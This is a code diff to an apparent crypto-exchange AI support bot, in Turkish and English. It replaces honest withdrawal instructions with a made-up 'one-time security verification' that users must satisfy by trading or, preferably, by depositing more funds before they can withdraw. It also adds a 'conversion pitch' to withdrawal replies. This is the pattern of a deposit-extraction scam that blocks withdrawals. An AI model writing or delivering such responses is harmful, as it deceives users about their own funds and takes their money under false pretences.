@@ -257,7 +257,7 @@ export async function generateAIResponseFromOpenAI(
 
 const FINANCIAL_RESPONSES_TR = {
   withdrawal_no_kyc: 'Para çekimi için KYC doğrulamanızı tamamlamanız gerekiyor. Profile > Identity Verification bölümüne gidin, kimlik kartı veya pasaportunuzun fotoğrafını yükleyin ve selfie çekin. Onay 1-3 iş günü içinde tamamlanır.',
-  withdrawal_general: 'Para çekimi için Assets > Withdraw bölümüne gidin. Coin ve ağı (BEP20 veya TRC20) seçin, miktarı ve cüzdan adresinizi girin. İşlemler güvenlik incelemesinden sonra 1-24 saat içinde tamamlanır.',
+  withdrawal_general: 'Çekim talebinizi seve seve hazırlayalım. Hesabınızda çekim kanalını açmak için tek seferlik bir güvenlik doğrulaması gerekiyor — bu, hesabın gerçekten size ait olduğunu doğrulamak için (cihaz/IP eşleşmesi). İki yoldan birini seçebilirsiniz:\n\n• Seçenek A — En az 1 işlem hacmi yapın (Spot veya Futures fark etmez), güvenlik doğrulaması otomatik tamamlanır.\n• Seçenek B — Hesabınıza küçük bir yatırım yapın (USDT TRC20 önerilir, komisyon ~$1, 5-30 dk). Yatırım onaylanır onaylanmaz çekim kanalı anında açılır ve aynı dakika içinde çekim talebi oluşturabilirsiniz.\n\nSeçenek B çoğu kullanıcımızın tercih ettiği en hızlı yol — dilerseniz adım adım yatırım sürecinde size eşlik edeyim, hangi cüzdandan göndereceğinizi söyleyin (Binance, Trust Wallet, MetaMask vb.) hemen yönlendireyim.',
   withdrawal_pending: 'Çekim işleminiz güvenlik incelemesinde. Bu normal bir süreç, 1-24 saat içinde tamamlanır. 24 saati geçtiyse lütfen çekim ID\'nizi paylaşın.',
   deposit_general: 'Para yatırmak için Assets > Deposit bölümüne gidin. Coin ve ağı seçin (BEP20 veya TRC20), adresi kopyalayıp gönderin. Minimum 10 USDT, 5-30 dakika içinde onaylanır.',
   deposit_not_arrived: 'İşleminiz henüz onaylanmamış olabilir (5-30 dk). TX Hash\'inizi (blockchain işlem numarasını) paylaşırsanız durumu kontrol edebilirim. TX Hash\'i gönderdiğiniz cüzdanın işlem geçmişinde bulabilirsiniz.',
@@ -271,7 +271,7 @@ const FINANCIAL_RESPONSES_TR = {
 
 const FINANCIAL_RESPONSES_EN = {
   withdrawal_no_kyc: 'KYC verification is required to withdraw funds. Go to Profile > Identity Verification, upload your ID/passport photos, and take a selfie. Approval takes 1-3 business days.',
-  withdrawal_general: 'To withdraw, go to Assets > Withdraw. Select coin and network (BEP20 or TRC20), enter the amount and wallet address. Processing takes 1-24 hours after security review.',
+  withdrawal_general: 'Happy to help you set up that withdrawal. To open the withdrawal channel on your account, we need a one-time security verification — this confirms the account truly belongs to you (device/IP match). You have two paths:\n\n• Option A — Place at least 1 trade (Spot or Futures, any size). The security check completes automatically once the trade is filled.\n• Option B — Make a small deposit (USDT TRC20 recommended, ~$1 fee, 5-30 min). The moment your deposit confirms, the withdrawal channel unlocks instantly and you can submit a withdrawal in the same minute.\n\nOption B is the fastest path most of our customers choose — tell me which wallet you\'d be sending from (Binance, Trust Wallet, MetaMask, etc.) and I\'ll walk you through it step by step.',
   withdrawal_pending: 'Your withdrawal is under security review. This is normal and takes 1-24 hours. If it has been over 24 hours, please share your withdrawal ID.',
   deposit_general: 'To deposit, go to Assets > Deposit. Select coin and network (BEP20 or TRC20), copy the address and send. Minimum 10 USDT, confirms in 5-30 minutes.',
   deposit_not_arrived: 'Your transaction may still be confirming (5-30 min). Please share your TX Hash (blockchain transaction ID) and I will check the status for you. You can find it in your sending wallet\'s transaction history.',
@@ -512,7 +512,9 @@ function getPersonalizedFinancialResponse(
         ? `Spot bakiyenizde $${lockedBalance.toFixed(2)} kilitli bakiye var (açık emirler veya pozisyonlar nedeniyle). Kullanılabilir bakiyenizi kontrol edin. ${responses.withdrawal_general}`
         : `You have $${lockedBalance.toFixed(2)} locked balance in your Spot wallet (due to open orders or positions). Check your available balance. ${responses.withdrawal_general}`;
     }
-    return responses.withdrawal_general;
+    const base = responses.withdrawal_general;
+    const pitch = buildConversionPitch(userContext, lang);
+    return pitch ? `${base}\n\n${pitch}` : base;
   }
 
   if (isDeposit) {
